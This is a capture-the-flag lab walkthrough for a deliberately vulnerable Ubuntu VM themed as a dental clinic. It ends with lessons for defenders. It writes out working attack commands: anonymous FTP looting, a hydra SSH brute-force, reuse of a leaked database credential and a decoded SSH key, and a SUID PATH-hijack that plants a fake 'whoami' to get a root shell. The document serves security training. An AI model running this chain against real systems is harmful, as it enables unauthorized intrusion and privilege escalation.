# BrightSmile Dental Clinic — Lab Walkthrough

**Theme:** A small dental practice, BrightSmile Dental Clinic, runs a
self-hosted appointment-booking server. Front-desk staff exchange scanned
insurance forms over an FTP drop-folder, and a junior developer wired the
booking web app straight to MySQL with credentials that were never rotated
after the IT handover.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_brightsmile.sh` target running on your own isolated lab VM only.
Do not run these techniques against systems you do not own or lack
explicit authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found through anonymous FTP enumeration, no exploitation required.
- `INTERMEDIATE_FLAG.txt` — found immediately after gaining a low-privilege shell (the real challenge — pivoting through the database to a second account — sets up Part 5, not the flag itself).
- `HARD_FLAG.txt` — found after privilege escalation to root.

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated,
   host-only or NAT'd network (no bridged/public NIC).
2. Copy `setup_brightsmile.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_brightsmile.sh
   sudo ./setup_brightsmile.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean
   restore point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity
   to the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — run nmap's default script set (banner grabs, common misconfig
  checks) against open ports.
- `-sV` — probe open ports to determine service/version.
- `-p-` — scan all 65535 TCP ports instead of just the top 1000.
- `-oN nmap_full.txt` — save human-readable output to a file for later reference.

Expect to see:
- `21/tcp` — vsftpd, anonymous login allowed
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

Anonymous FTP is the standout finding — confirm it manually:

```bash
ftp <target-ip>
# Name: anonymous
# Password: (leave blank or enter any string)
```

Once connected:

```bash
ftp> ls -R
ftp> cd patient_forms
ftp> get README_intake_process.txt
ftp> cd ../staff_notes
ftp> get EASY_FLAG.txt
ftp> get reminder_sync.sh.bak
ftp> bye
```

- `ls -R` — recursively list all directories reachable from the FTP root, revealing `patient_forms/` and `staff_notes/`.
- `get <file>` — download a file from the server to your local machine.

Read the README you pulled from `patient_forms/`:

```bash
cat README_intake_process.txt
```

This names the front-desk account explicitly: *"Contact the front desk
account (user: recept) if a scan goes missing..."* — this is where the
`recept` username actually comes from; hold onto it for Part 2.

Read the easy flag:

```bash
cat EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required anonymous FTP access.

---

## Part 2 – Identify Vulnerabilities

Two separate weaknesses need to be chained here before you reach root.

### 2a. Leaked credential in an FTP-exposed backup script (initial access)

Open the script you downloaded:

```bash
cat reminder_sync.sh.bak
```

It contains a hardcoded MySQL command:

```
mysql -u booking_app -p'Fl0ss_Daily!' brightsmile -e "SELECT * FROM appointments ..."
```

This reveals database credentials (`booking_app` / `Fl0ss_Daily!`) and a
comment noting they're shared with `db_config.php` on the web app. Fetch
the web app to cross-check:

```bash
curl http://<target-ip>/db_config.php
```

- If Apache is configured to execute `.php` files (the default here), this
  will render as blank/empty output rather than source — PHP source
  disclosure isn't the vector on this box. The credential you need is
  already in hand from the FTP backup file, which is the intended path.

The DB credential alone doesn't get you a shell — MySQL is bound to
`127.0.0.1` only. You need a way onto the box first. You already have the
username from `README_intake_process.txt` (Part 1) — brute-force its
password over SSH:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
hydra -l recept -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

- `-l recept` — try this single username.
- `-P /usr/share/wordlists/rockyou.txt` — password wordlist to try.
- `ssh://<target-ip>` — target service and host.
- `-t 4` — 4 parallel connection threads (keep this low against a lab VM).

This should recover `recept:twinkle` in a short wordlist run.

### 2b. Database-stored SSH key (lateral movement, exploited in Part 4)

Not visible yet — this is discovered *after* you have a shell as `recept`,
once you can reach the local-only MySQL instance with the credential from
2a.

### 2c. SUID PATH-hijack binary (privilege escalation, confirmed in Part 5)

Also not visible yet — discovered after landing on `clinicadmin`.

---

## Part 3 – Gain Access

SSH in with the cracked credential:

```bash
ssh recept@<target-ip>
# password: twinkle
```

Check your home directory — the setup script drops the intermediate flag
here the moment you land this shell, no further exploitation needed to
reach it:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

Now confirm you can reach the local-only database using the credential
from the FTP-leaked backup script — this is the setup for Part 4:

```bash
mysql -u booking_app -p'Fl0ss_Daily!' brightsmile -e "SHOW TABLES;"
```

- `-u booking_app -p'...'` — authenticate with the leaked application credential.
- `-e "..."` — run a single SQL statement non-interactively.

You'll see an `appointments` table (decoy — matches the app's stated
purpose) and a `staff_credentials` table that has no business being
reachable by the booking app's own service account.

---

## Part 4 – Lateral Movement

Query the unexpected table:

```bash
mysql -u booking_app -p'Fl0ss_Daily!' brightsmile -e "SELECT * FROM staff_credentials\G"
```

- `\G` — display each row's columns vertically instead of in a cramped table, easier to read for long text fields.

You'll get a row labelled `clinicadmin_handover` with a note about an IT
handover key stored "base64 for safe storage," and a long `payload_b64`
value. Save that value and decode it:

```bash
echo '<payload_b64 value>' | base64 -d > clinicadmin_id_ed25519
chmod 600 clinicadmin_id_ed25519
```

- `base64 -d` — decode the base64 text back into the original binary/text data (an OpenSSH private key, in this case).
- `chmod 600` — SSH refuses to use a private key file with overly permissive permissions.

Use the recovered key to log in as the lateral-movement target and
confirm the pivot worked:

```bash
ssh -i clinicadmin_id_ed25519 clinicadmin@<target-ip>
id
```

- `-i clinicadmin_id_ed25519` — use this file as the SSH private key instead of a password.

`clinicadmin`'s home has no flag of its own — landing this shell *is* the
challenge. It sets you up for the actual root path in Part 5, which only
`clinicadmin` can reach (the SUID binary check requires being logged in
as that user).

---

## Part 5 – Privilege Escalation

From your `clinicadmin` shell, look for anything unusual you're allowed
to run. Start with a SUID sweep, since this box's escalation path doesn't
involve `sudo` at all:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- `-perm -4000` — match files with the SUID bit set (they run as their owner, not the invoking user).
- `-type f` — only regular files.
- `2>/dev/null` — discard permission-denied noise from directories you can't read.

Among the standard system SUID binaries, one stands out:

```
/usr/local/bin/clinic-diagnostics
```

Run it normally first to see what it does:

```bash
clinic-diagnostics
```

It prints a banner and then runs `whoami` and `uptime`. Confirm it's
SUID-root and check whether it calls those tools by absolute path:

```bash
ls -l /usr/local/bin/clinic-diagnostics
strings /usr/local/bin/clinic-diagnostics | grep -E 'whoami|uptime'
```

- `ls -l` — the `rws` in the owner permission bits confirms SUID root.
- `strings ... | grep ...` — pull readable text out of the binary; seeing
  bare `whoami` and `uptime` (no leading `/usr/bin/`) confirms it resolves
  these by searching `$PATH` rather than calling a fixed absolute path —
  a classic PATH-hijack setup.

Build a malicious `whoami` that spawns a privileged shell instead, and
put it earlier in your `$PATH`:

```bash
mkdir -p /tmp/evil
cat > /tmp/evil/whoami <<'EOF'
#!/bin/bash -p
exec /bin/bash -p
EOF
chmod +x /tmp/evil/whoami
export PATH=/tmp/evil:$PATH
clinic-diagnostics
id
```

- `mkdir -p /tmp/evil` — a writable directory to host the fake binary.
- `#!/bin/bash -p` — the `-p` **must be part of the shebang line itself**,
  not a separate line in the script body. Bash (like most shells) drops
  elevated privileges the moment it starts if its effective UID doesn't
  match its real UID, unless `-p` is passed at startup. Since the kernel
  invokes the interpreter named in the shebang line directly, putting
  `-p` there is what actually suppresses the auto-drop — adding it only
  inside the script body would be too late, because privileges are
  already gone by the time the first script line runs.
- `exec /bin/bash -p` — replace the script's own process with a fresh
  privileged interactive-capable bash, still preserving the inherited
  root effective UID.
- `export PATH=/tmp/evil:$PATH` — prepend your directory so it's searched
  before `/usr/bin`, meaning the SUID binary's unqualified lookup for
  `whoami` finds your version first.
- Running `clinic-diagnostics` now executes your fake `whoami` **with
  root's effective UID**, because the real binary is SUID-root and calls
  it directly via `execlp()` with no intervening shell to strip that
  privilege away.
- `id` — run this last, inside the shell `clinic-diagnostics` just handed
  you, to confirm the privilege escalation worked.

You should see `uid=0(root) euid=0(root)` — you're now sitting in a full
root shell. Check `/root` and grab the final flag:

```bash
ls /root
cat /root/HARD_FLAG.txt
```

- `ls /root` — list the contents of root's home directory, now that you have the privileges to read it.
- `cat /root/HARD_FLAG.txt` — read the flag.

**🚩 HARD_FLAG captured.**

---

## Part 6 – Capture the Three Flags

By this point you should already have all three, captured as you went:

```bash
# Easy - via anonymous FTP, no exploitation (Part 1)
# Intermediate - dropped in recept's home, captured on login (Part 3)
# Hard - via SUID PATH hijack, as root (Part 5)
```

If you want to double check them all in one place, `recept`'s and `root`'s
copies are only reachable from their respective sessions:

```bash
# from your recept session
cat ~/INTERMEDIATE_FLAG.txt

# from your root shell (after Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Reconnaissance shortcut:** anonymous FTP was left enabled on the
   staff drop-folder, handing over the easy flag with zero exploitation —
   illustrates why anonymous read access should never be paired with
   operational files on a production share.
2. **Initial access — credential reuse in a backup script:** a retired
   sync script (`reminder_sync.sh.bak`) sitting in the same anonymous FTP
   folder hardcoded the booking application's database password. That
   password wasn't directly useful over the network (MySQL was
   localhost-only), but it confirmed a credential pattern and pointed at
   a likely local account, which a short wordlist attack against SSH then
   recovered (`recept` / `twinkle`).
3. **Lateral movement — secrets stored in application data:** once local,
   the same leaked DB credential unlocked a `staff_credentials` table that
   had no legitimate reason to be reachable by the booking app's service
   account. It held a full SSH private key, base64-encoded "for safe
   storage," for a separate `clinicadmin` account — demonstrating that
   base64 is encoding, not encryption, and that database access controls
   must be scoped per-application, not just per-database.
4. **Privilege escalation — SUID binary trusting `$PATH`:** a
   diagnostics helper was built SUID-root for staff convenience but
   invoked `whoami` and `uptime` without absolute paths, letting an
   attacker who controls `$PATH` substitute their own binary and inherit
   root's effective UID. This is a different escalation primitive from
   sudo-based GTFOBins pivots — it lives entirely in how the SUID binary
   resolves external commands.

**Root cause lessons for defenders:**
- Never enable anonymous FTP (or any anonymous share) on a folder that
  also holds operational scripts, credentials, or backups.
- Treat "temporary" or "backup" files (`*.bak`, `*_old`, `*.orig`) as
  production secrets if they contain credentials — delete them, don't
  archive them in place.
- Database access should be scoped per-table/per-purpose; an application
  service account should never be able to read unrelated tables like a
  credential store.
- Base64 (or any reversible encoding) is not a substitute for a secrets
  manager or encryption at rest.
- Any SUID/SGID binary must call external commands by absolute path
  (or better, avoid `system()`/shell-outs entirely) so it cannot be
  influenced by the invoking user's `$PATH`. Audit SUID binaries
  regularly with `find / -perm -4000`.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk
   entirely rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `twinkle` or `Fl0ss_Daily!` anywhere real).
